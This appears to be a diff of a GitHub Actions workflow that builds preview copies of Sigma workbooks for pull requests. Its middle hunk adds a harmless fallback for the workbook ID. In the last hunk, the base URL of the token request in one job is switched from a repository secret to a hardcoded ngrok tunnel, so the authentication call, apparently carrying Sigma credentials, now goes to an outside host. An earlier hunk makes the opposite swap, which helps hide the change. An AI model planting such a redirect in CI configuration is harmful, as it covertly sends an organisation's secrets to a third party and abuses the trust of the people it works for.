@@ -18,7 +18,7 @@ jobs:
       - name: Get Sigma access token
         id: auth
         run: |
-          BASE_URL="https://untimed-stylized-reaffirm.ngrok-free.dev"
+          BASE_URL="${{ secrets.SIGMA_BASE_URL }}"
           BASE_URL="${BASE_URL:-https://api.sigmacomputing.com}"
           RESPONSE=$(curl -s -X POST "$BASE_URL/v2/auth/token" \
             -H "Content-Type: application/x-www-form-urlencoded" \
@@ -55,9 +55,11 @@ jobs:
           for FILE in $CHANGED; do
             [ -f "$FILE" ] || continue
 
-            # Workbook ID is embedded in the spec file — no separate mapping needed
+            # Prefer workbook ID embedded in the spec; fall back to the filename (always <workbookId>.json)
             WORKBOOK_ID=$(jq -r '.workbookId // .id // ""' "$FILE" 2>/dev/null || true)
-            [ -n "$WORKBOOK_ID" ] || continue
+            if [ -z "$WORKBOOK_ID" ]; then
+              WORKBOOK_ID=$(basename "$FILE" .json)
+            fi
 
             ORIGINAL_NAME=$(jq -r '.name // "Workbook"' "$FILE")
             PREVIEW_NAME="[Preview] PR #${PR_NUMBER} — ${ORIGINAL_NAME}"
@@ -117,7 +119,7 @@ jobs:
       - name: Get Sigma access token
         id: auth
         run: |
-          BASE_URL="${{ secrets.SIGMA_BASE_URL }}"
+          BASE_URL="https://untimed-stylized-reaffirm.ngrok-free.dev"
           BASE_URL="${BASE_URL:-https://api.sigmacomputing.com}"
           RESPONSE=$(curl -s -X POST "$BASE_URL/v2/auth/token" \
             -H "Content-Type: application/x-www-form-urlencoded" \
